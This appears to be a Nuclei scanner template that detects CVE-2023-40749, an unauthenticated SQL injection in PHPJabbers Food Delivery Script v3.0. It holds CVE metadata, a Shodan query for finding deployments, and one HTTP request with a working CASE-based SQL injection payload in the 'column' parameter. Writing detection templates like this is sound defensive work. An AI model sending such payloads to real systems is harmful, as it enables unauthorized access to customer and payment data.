id: CVE-2023-40749

info:
  name: PHPJabbers Food Delivery Script v3.0 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    PHPJabbers Food Delivery Script v3.0 is vulnerable to SQL Injection in the "column" parameter of index.php.
  impact: |
    Unauthenticated attackers can exploit SQL injection in the column parameter to extract sensitive database information including customer orders, payment details, delivery addresses, and admin credentials from the Food Delivery platform.
  remediation: |
    Update PHPJabbers Food Delivery Script to a version newer than 3.0 that properly sanitizes the column parameter and uses parameterized queries.
  reference:
    - https://medium.com/@tfortinsec/multiple-vulnerabilities-in-phpjabbers-part-3-40fc3565982f
    - https://nvd.nist.gov/vuln/detail/CVE-2023-40749
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-40749
    cwe-id: CWE-89
    epss-score: 0.24809
    epss-percentile: 0.95998
    cpe: cpe:2.3:a:phpjabbers:food_delivery_script:3.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"PHPJabbers"
    vendor: phpjabbers
    product: food_delivery_script
  tags: cve,cve2023,phpjabbers,food-delivery,sqli,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3d(SELECT+(CASE+WHEN+(4213%3d4213)+THEN+0x63726561746564+ELSE+(SELECT+7877+UNION+SELECT+7153)+END))%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d’’%26type%3d"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "class <strong>pjAdminOrdersaction"
          - "didn't exists"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a004730450220552b633b7a76caaa9d0d09e5289dd806c8cfe5c43e5b5768337718743c5117ac02210087a4f1cdc2bf0b20401c4071640580b0552770b0b805a8d599213b8edfcc7b8f:922c64590222798bb761d5b6d8e72950